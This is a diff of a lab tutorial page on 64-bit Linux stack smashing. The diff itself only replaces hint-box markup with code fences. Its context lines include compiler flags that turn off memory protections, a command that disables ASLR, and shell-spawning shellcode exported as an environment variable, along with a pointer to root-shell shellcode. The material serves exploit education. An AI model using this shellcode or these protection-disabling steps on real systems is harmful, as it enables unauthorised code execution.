@@ -13,9 +13,9 @@ The purpose of this lab is to understand how to get control of the RIP register 
 
 This lab is based on a great post [https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/).
 
-{% hint style="info" %}
+```
 Note that the vulnerable program used in this lab was compiled without memory protections deliberately and similarly, the ASLR was disabled.
-{% endhint %}
+```
 
 ## Useful notes
 
@@ -61,13 +61,13 @@ int main(int argc, char *argv[]) {
 {% endtab %}
 {% endtabs %}
 
-{% hint style="info" %}
+```
 **Remember about the stack**
 
 * Stack grows downwards
 * Local variables are defined at lower stack addresses
 * Return address is located higher up in the stack, compared to local variables
-{% endhint %}
+```
 
 We can compile the above code with:
 
@@ -75,13 +75,13 @@ We can compile the above code with:
 gcc -fno-stack-protector -z execstack vulnerable.c -o vulnerable
 ```
 
-{% hint style="warning" %}
+```
 Don't forget to disable the ASLR:
 
 ```
 echo 0 > /proc/sys/kernel/randomize_va_space
 ```
-{% endhint %}
+```
 
 ## Getting Control of RIP
 
@@ -179,9 +179,9 @@ We'd like the vulnerable program to spawn a shell for us when exploited, so we w
 export PWN=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
 ```
 
-{% hint style="info" %}
+```
 Note that if you are trying to replicate this in your lab and you would like the vulnerable program to spawn a root shell, you need to use the [shellcode](http://shell-storm.org/shellcode/files/shellcode-77.php) that calls `setuid(0)` first. Thanks [@reveng007](https://twitter.com/reveng007).
-{% endhint %}
+```
 
 We now need to find where on stack the `PWN` environment variable will be located in the vulnerable program. For this, we can use the following program:
 
